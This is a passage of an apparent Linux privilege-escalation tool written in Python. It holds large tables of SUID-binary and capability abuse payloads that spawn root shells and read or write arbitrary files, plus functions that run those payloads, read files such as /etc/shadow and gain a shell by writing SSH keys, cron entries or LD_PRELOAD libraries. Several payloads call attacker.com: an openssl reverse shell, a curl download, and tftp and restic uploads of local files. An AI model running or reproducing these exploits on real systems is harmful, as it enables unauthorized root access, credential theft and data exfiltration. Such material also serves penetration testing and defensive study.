    ],
    "bzip2": [
        {
            "code": "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
        }
    ],
    "cabal": [
        {
            "code": "./cabal exec -- /bin/sh -p"
        }
    ],
    "capsh": [
        {
            "code": "./capsh --gid=0 --uid=0 --"
        }
    ],
    "cat": [
        {
            "code": "LFILE=file_to_read\n./cat \"$LFILE\"\n"
        }
    ],
    "chmod": [
        {
            "code": "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
        }
    ],
    "choom": [
        {
            "code": "./choom -n 0 -- /bin/sh -p"
        }
    ],
    "chown": [
        {
            "code": "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
        }
    ],
    "chroot": [
        {
            "code": "./chroot / /bin/sh -p\n"
        }
    ],
    "clamscan": [
        {
            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
        }
    ],
    "cmp": [
        {
            "code": "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
        }
    ],
    "column": [
        {
            "code": "LFILE=file_to_read\n./column $LFILE\n"
        }
    ],
    "comm": [
        {
            "code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
        }
    ],
    "cp": [
        {
            "code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n"
        },
        {
            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
            "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
        },
        {
            "code": "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n",
            "description": "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another."
        }
    ],
    "cpio": [
        {
            "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
            "description": "The whole directory structure is copied to `$TF`."
        },
        {
            "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n",
            "description": "Copies `$LFILE` to the `$LDIR` directory."
        }
    ],
    "cpulimit": [
        {
            "code": "./cpulimit -l 100 -f -- /bin/sh -p"
        }
    ],
    "csh": [
        {
            "code": "./csh -b"
        }
    ],
    "csplit": [
        {
            "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
        }
    ],
    "csvtool": [
        {
            "code": "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
        }
    ],
    "cupsfilter": [
        {
            "code": "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
        }
    ],
    "curl": [
        {
            "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n",
            "description": "Fetch a remote file via HTTP GET request."
        }
    ],
    "cut": [
        {
            "code": "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
        }
    ],
    "dash": [
        {
            "code": "./dash -p"
        }
    ],
    "date": [
        {
            "code": "LFILE=file_to_read\n./date -f $LFILE\n"
        }
    ],
    "dd": [
        {
            "code": "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
        }
    ],
    "debugfs": [
        {
            "code": "./debugfs\n!/bin/sh\n"
        }
    ],
    "dialog": [
        {
            "code": "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
        }
    ],
    "diff": [
        {
            "code": "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
        }
    ],
    "dig": [
        {
            "code": "LFILE=file_to_read\n./dig -f $LFILE\n"
        }
    ],
    "distcc": [
        {
            "code": "./distcc /bin/sh -p"
        }
    ],
    "dmsetup": [
        {
            "code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
        }
    ],
    "docker": [
        {
            "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "description": "The resulting is a root shell."
        }
    ],
    "dosbox": [
        {
            "code": "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
            "description": "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
        }
    ],
    "ed": [
        {
            "code": "./ed file_to_read\n,p\nq\n"
        }
    ],
    "efax": [
        {
            "code": "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
        }
    ],
    "elvish": [
        {
            "code": "./elvish"
        }
    ],
    "emacs": [
        {
            "code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
        }
    ],
    "env": [
        {
            "code": "./env /bin/sh -p"
        }
    ],
    "eqn": [
        {
            "code": "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
        }
    ],
    "espeak": [
        {
            "code": "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
        }
    ],
    "expand": [
        {
            "code": "LFILE=file_to_read\n./expand \"$LFILE\"\n"
        }
    ],
    "expect": [
        {
            "code": "./expect -c 'spawn /bin/sh -p;interact'"
        }
    ],
    "file": [
        {
            "code": "LFILE=file_to_read\n./file -f $LFILE\n",
            "description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
        }
    ],
    "find": [
        {
            "code": "./find . -exec /bin/sh -p \\; -quit"
        }
    ],
    "fish": [
        {
            "code": "./fish"
        }
    ],
    "flock": [
        {
            "code": "./flock -u / /bin/sh -p"
        }
    ],
    "fmt": [
        {
            "code": "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n",
            "description": "This corrupts the output by wrapping very long lines at the given width."
        }
    ],
    "fold": [
        {
            "code": "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
        }
    ],
    "gawk": [
        {
            "code": "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
        }
    ],
    "gcore": [
        {
            "code": "./gcore $PID"
        }
    ],
    "gdb": [
        {
            "code": "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
            "description": "This requires that GDB is compiled with Python support."
        }
    ],
    "genie": [
        {
            "code": "./genie -c '/bin/sh'"
        }
    ],
    "genisoimage": [
        {
            "code": "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n",
            "description": "The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
        }
    ],
    "gimp": [
        {
            "code": "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        }
    ],
    "grep": [
        {
            "code": "LFILE=file_to_read\n./grep '' $LFILE\n"
        }
    ],
    "gtester": [
        {
            "code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
        }
    ],
    "gzip": [
        {
            "code": "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
        }
    ],
    "hd": [
        {
            "code": "LFILE=file_to_read\n./hd \"$LFILE\"\n"
        }
    ],
    "head": [
        {
            "code": "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
        }
    ],
    "hexdump": [
        {
            "code": "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
        }
    ],
    "highlight": [
        {
            "code": "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
        }
    ],
    "hping3": [
        {
            "code": "./hping3\n/bin/sh -p\n"
        }
    ],
    "iconv": [
        {
            "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
        }
    ],
    "install": [
        {
            "code": "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
        }
    ],
    "ionice": [
        {
            "code": "./ionice /bin/sh -p"
        }
    ],
    "ip": [
        {
            "code": "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n"
        },
        {
            "code": "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n",
            "description": "This only works for Linux with CONFIG_NET_NS=y."
        }
    ],
    "ispell": [
        {
            "code": "./ispell /etc/passwd\n!/bin/sh -p\n"
        }
    ],
    "jjs": [
        {
            "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs",
            "description": "This has been found working in macOS but failing on Linux systems."
        }
    ],
    "join": [
        {
            "code": "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
        }
    ],
    "jq": [
        {
            "code": "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
        }
    ],
    "jrunscript": [
        {
            "code": "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"",
            "description": "This has been found working in macOS but failing on Linux systems."
        }
    ],
    "julia": [
        {
            "code": "./julia -e 'run(`/bin/sh -p`)'\n"
        }
    ],
    "ksh": [
        {
            "code": "./ksh -p"
        }
    ],
    "ksshell": [
        {
            "code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"
        }
    ],
    "kubectl": [
        {
            "code": "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
        }
    ],
    "ld.so": [
        {
            "code": "./ld.so /bin/sh -p"
        }
    ],
    "less": [
        {
            "code": "./less file_to_read"
        }
    ],
    "logsave": [
        {
            "code": "./logsave /dev/null /bin/sh -i -p"
        }
    ],
    "look": [
        {
            "code": "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
        }
    ],
    "lua": [
        {
            "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
        }
    ],
    "make": [
        {
            "code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
        }
    ],
    "mawk": [
        {
            "code": "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
        }
    ],
    "minicom": [
        {
            "code": "./minicom -D /dev/null\n",
            "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n"
        }
    ],
    "more": [
        {
            "code": "./more file_to_read"
        }
    ],
    "mosquitto": [
        {
            "code": "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
        }
    ],
    "msgattrib": [
        {
            "code": "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
        }
    ],
    "msgcat": [
        {
            "code": "LFILE=file_to_read\n./msgcat -P $LFILE\n"
        }
    ],
    "msgconv": [
        {
            "code": "LFILE=file_to_read\n./msgconv -P $LFILE\n"
        }
    ],
    "msgfilter": [
        {
            "code": "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n",
            "description": "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
        }
    ],
    "msgmerge": [
        {
            "code": "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
        }
    ],
    "msguniq": [
        {
            "code": "LFILE=file_to_read\n./msguniq -P $LFILE\n"
        }
    ],
    "multitime": [
        {
            "code": "./multitime /bin/sh -p"
        }
    ],
    "mv": [
        {
            "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
        }
    ],
    "nasm": [
        {
            "code": "LFILE=file_to_read\n./nasm -@ $LFILE\n"
        }
    ],
    "nawk": [
        {
            "code": "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
        }
    ],
    "ncftp": [
        {
            "code": "./ncftp\n!/bin/sh -p\n"
        }
    ],
    "nft": [
        {
            "code": "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
        }
    ],
    "nice": [
        {
            "code": "./nice /bin/sh -p"
        }
    ],
    "nl": [
        {
            "code": "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
        }
    ],
    "nm": [
        {
            "code": "LFILE=file_to_read\n./nm @$LFILE\n"
        }
    ],
    "nmap": [
        {
            "code": "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n",
            "description": "The payload appears inside the regular nmap output."
        }
    ],
    "node": [
        {
            "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
        }
    ],
    "nohup": [
        {
            "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
        }
    ],
    "ntpdate": [
        {
            "code": "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n"
        }
    ],
    "od": [
        {
            "code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
        }
    ],
    "openssl": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
            "description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n"
        },
        {
            "code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
        }
    ],
    "openvpn": [
        {
            "code": "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"
        },
        {
            "code": "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n",
            "description": "The file is actually parsed and the first partial wrong line is returned in an error message."
        }
    ],
    "pandoc": [
        {
            "code": "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
        }
    ],
    "paste": [
        {
            "code": "LFILE=file_to_read\npaste $LFILE\n"
        }
    ],
    "perf": [
        {
            "code": "./perf stat /bin/sh -p\n"
        }
    ],
    "perl": [
        {
            "code": "./perl -e 'exec \"/bin/sh\";'"
        }
    ],
    "pexec": [
        {
            "code": "./pexec /bin/sh -p"
        }
    ],
    "pg": [
        {
            "code": "./pg file_to_read"
        }
    ],
    "php": [
        {
            "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
        }
    ],
    "pidstat": [
        {
            "code": "COMMAND=id\n./pidstat -e $COMMAND\n"
        }
    ],
    "pr": [
        {
            "code": "LFILE=file_to_read\npr -T $LFILE\n"
        }
    ],
    "ptx": [
        {
            "code": "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
        }
    ],
    "python": [
        {
            "code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        }
    ],
    "rc": [
        {
            "code": "./rc -c '/bin/sh -p'"
        }
    ],
    "readelf": [
        {
            "code": "LFILE=file_to_read\n./readelf -a @$LFILE\n"
        }
    ],
    "restic": [
        {
            "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
        }
    ],
    "rev": [
        {
            "code": "LFILE=file_to_read\n./rev $LFILE | rev\n"
        }
    ],
    "rlwrap": [
        {
            "code": "./rlwrap -H /dev/null /bin/sh -p"
        }
    ],
    "rsync": [
        {
            "code": "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        }
    ],
    "rtorrent": [
        {
            "code": "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
        }
    ],
    "run-parts": [
        {
            "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
        }
    ],
    "rview": [
        {
            "code": "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "rvim": [
        {
            "code": "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "sash": [
        {
            "code": "./sash"
        }
    ],
    "scanmem": [
        {
            "code": "./scanmem\nshell /bin/sh\n"
        }
    ],
    "sed": [
        {
            "code": "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
        }
    ],
    "setarch": [
        {
            "code": "./setarch $(arch) /bin/sh -p"
        }
    ],
    "setfacl": [
        {
            "code": "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
        }
    ],
    "setlock": [
        {
            "code": "./setlock - /bin/sh -p"
        }
    ],
    "shuf": [
        {
            "code": "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n",
            "description": "The written file content is corrupted by adding a newline."
        }
    ],
    "soelim": [
        {
            "code": "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
        }
    ],
    "softlimit": [
        {
            "code": "./softlimit /bin/sh -p"
        }
    ],
    "sort": [
        {
            "code": "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
        }
    ],
    "sqlite3": [
        {
            "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
        }
    ],
    "ss": [
        {
            "code": "LFILE=file_to_read\n./ss -a -F $LFILE\n"
        }
    ],
    "ssh-agent": [
        {
            "code": "./ssh-agent /bin/ -p"
        }
    ],
    "ssh-keygen": [
        {
            "code": "./ssh-keygen -D ./lib.so",
            "description": ""
        }
    ],
    "ssh-keyscan": [
        {
            "code": "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
        }
    ],
    "sshpass": [
        {
            "code": "./sshpass /bin/sh -p"
        }
    ],
    "start-stop-daemon": [
        {
            "code": "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
        }
    ],
    "stdbuf": [
        {
            "code": "./stdbuf -i0 /bin/sh -p"
        }
    ],
    "strace": [
        {
            "code": "./strace -o /dev/null /bin/sh -p"
        }
    ],
    "strings": [
        {
            "code": "LFILE=file_to_read\n./strings \"$LFILE\"\n"
        }
    ],
    "sysctl": [
        {
            "code": "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
        }
    ],
    "systemctl": [
        {
            "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
        }
    ],
    "tac": [
        {
            "code": "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
        }
    ],
    "tail": [
        {
            "code": "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
        }
    ],
    "taskset": [
        {
            "code": "./taskset 1 /bin/sh -p"
        }
    ],
    "tbl": [
        {
            "code": "LFILE=file_to_read\n./tbl $LFILE\n"
        }
    ],
    "tclsh": [
        {
            "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
        }
    ],
    "tee": [
        {
            "code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
        }
    ],
    "terraform": [
        {
            "code": "./terraform console\nfile(\"file_to_read\")\n"
        }
    ],
    "tftp": [
        {
            "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n",
            "description": "Send local file to a TFTP server."
        }
    ],
    "tic": [
        {
            "code": "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
        }
    ],
    "time": [
        {
            "code": "./time /bin/sh -p"
        }
    ],
    "timeout": [
        {
            "code": "./timeout 7d /bin/sh -p"
        }
    ],
    "troff": [
        {
            "code": "LFILE=file_to_read\n./troff $LFILE\n"
        }
    ],
    "ul": [
        {
            "code": "LFILE=file_to_read\n./ul \"$LFILE\"\n"
        }
    ],
    "unexpand": [
        {
            "code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
        }
    ],
    "uniq": [
        {
            "code": "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
        }
    ],
    "unshare": [
        {
            "code": "./unshare -r /bin/sh"
        }
    ],
    "unsquashfs": [
        {
            "code": "./unsquashfs shell\n./squashfs-root/sh -p\n"
        }
    ],
    "unzip": [
        {
            "code": "./unzip -K shell.zip\n./sh -p\n"
        }
    ],
    "update-alternatives": [
        {
            "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
            "description": "Write in `$LFILE` a symlink to `$TF`."
        }
    ],
    "uudecode": [
        {
            "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
        }
    ],
    "uuencode": [
        {
            "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
        }
    ],
    "vagrant": [
        {
            "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
        }
    ],
    "varnishncsa": [
        {
            "code": "LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
        }
    ],
    "view": [
        {
            "code": "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "vigr": [
        {
            "code": "./vigr"
        }
    ],
    "vim": [
        {
            "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "vimdiff": [
        {
            "code": "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "vipw": [
        {
            "code": "./vipw"
        }
    ],
    "w3m": [
        {
            "code": "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
        }
    ],
    "watch": [
        {
            "code": "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
            "description": "This keeps the SUID privileges only if the `-x` option is present."
        }
    ],
    "wc": [
        {
            "code": "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
        }
    ],
    "wget": [
        {
            "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
        }
    ],
    "whiptail": [
        {
            "code": "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
        }
    ],
    "xargs": [
        {
            "code": "./xargs -a /dev/null sh -p",
            "description": "GNU version only."
        }
    ],
    "xdotool": [
        {
            "code": "./xdotool exec --sync /bin/sh -p"
        }
    ],
    "xmodmap": [
        {
            "code": "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
        }
    ],
    "xmore": [
        {
            "code": "LFILE=file_to_read\n./xmore $LFILE\n"
        }
    ],
    "xxd": [
        {
            "code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
        }
    ],
    "xz": [
        {
            "code": "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
        }
    ],
    "yash": [
        {
            "code": "./yash"
        }
    ],
    "zsh": [
        {
            "code": "./zsh"
        }
    ],
    "zsoelim": [
        {
            "code": "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
        }
    ]
}
# SUID_BINS_END

# CAPABILITIES_START
capabilities = {
    "gdb": [
        {
            "code": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
            "description": "This requires that GDB is compiled with Python support."
        }
    ],
    "node": [
        {
            "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
        }
    ],
    "perl": [
        {
            "code": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
        }
    ],
    "php": [
        {
            "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
        }
    ],
    "python": [
        {
            "code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        }
    ],
    "ruby": [
        {
            "code": "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
        }
    ],
    "rview": [
        {
            "code": "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "rvim": [
        {
            "code": "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "view": [
        {
            "code": "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "vim": [
        {
            "code": "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ],
    "vimdiff": [
        {
            "code": "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
        }
    ]
}
# CAPABILITIES_END

SUDO_NO_PASSWD = "Sudo NOPASSWD"
SUID_SGID = "SUID/SGID Binary"
try:
    input = raw_input
except NameError:
    pass

RED = '\033[31m'
GREEN = '\033[32m'
LIGHTGREY = '\033[37m'
RESET = '\033[0m'
YELLOW = '\033[0;33m'
BOLD = '\033[1m'


class CustomLogger(logging.Logger):
    def __init__(self, name, level=logging.DEBUG):
        super(CustomLogger, self).__init__(name, level)

        self.console_handler = logging.StreamHandler()
        self.console_handler.setLevel(logging.DEBUG)

        formatter = CustomFormatter()
        self.console_handler.setFormatter(formatter)

        self.addHandler(self.console_handler)

    def set_level(self, level):
        self.setLevel(level)
        self.console_handler.setLevel(level)


class CustomFormatter(logging.Formatter):
    def format(self, record):
        if record.levelno == logging.INFO:
            record.msg = GREEN + "[+] " + RESET + str(record.msg)
        elif record.levelno == logging.ERROR:
            record.msg = RED + "[x] " + RESET + str(record.msg)
        elif record.levelno == logging.WARNING:
            record.msg = GREEN + "[!] " + RESET + str(record.msg)
        return super(CustomFormatter, self).format(record)


logging.setLoggerClass(CustomLogger)

log = logging.getLogger(__name__)
log.set_level(logging.INFO)


def execute_command(command):
    """
    Executes a given command using subprocess and returns the output.
    Compatible with Python 2.* and 3.*.

    :param command: Command to execute as a string or list.
    :return: A tuple containing the standard output and standard error.
    """
    try:
        if isinstance(command, list):
            command = " ".join(command)

        log.debug("Executing %s", command)

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        output, error = process.communicate()

        if sys.version_info[0] == 3:
            output = output.decode('utf-8') if output else output
            error = error.decode('utf-8') if error else error

        if output:
            log.debug("Output: %s", output)
        if error:
            log.error("Error: %s", error)
        return output, error

    except OSError as e:
        return None, "OS error occurred: " + str(e)


def arbitrary_file_read(binary, payload, auto, user="root", command=None):
    """Exploit arbitrary file read vulnerability.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
    """
    log.info("Performing arbitrary file read with %s", binary)

    if is_service_running("ssh"):
        ssh_key_privesc(payload, user, command)
    if auto:
        return
    print("Enter the file that you wish to read. (eg: /etc/shadow)")
    file_to_read = input("> ")
    payload = payload.replace("file_to_read", file_to_read)
    os.system(payload)


def get_arb_write_options(user):
    options = []
    if is_service_running("ssh"):
        options.append(("ssh", "Obtain shell by writing SSH key"))
    if user == "root" and is_service_running("cron"):
        options.append(("cron", "Obtain shell by writing to Cron"))
    options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
    options.append(("arbitrary", "Arbitrary file Write (no shell)"))
    return options


def arbitrary_file_write(binary, payload, risk, auto, user="root", command=None):
    """Exploit arbitrary file write.

    Args:
        binary (str): Binary to exploit.
        payload (str): Exploit payload.
        user (str): User to exploit.
    """
    log.info("Performing arbitrary file write with %s", binary)
    if risk == 1:
        manual_arbitrary_file_write(payload)
        return
    if risk == 2 and not auto:
        options = get_arb_write_options(user)
        print("\nSelect an exploit option:")
        for index, (_, description) in enumerate(options):
            print(GREEN + "[" + str(index) + "] " + RESET + description)
        choice = get_user_choice("> ")
        chosen_option = options[choice][0]
        if chosen_option == "ssh":
            ssh_write_privesc(payload, user, command)
        elif chosen_option == "cron":
            cron_priv_esc(payload, command)
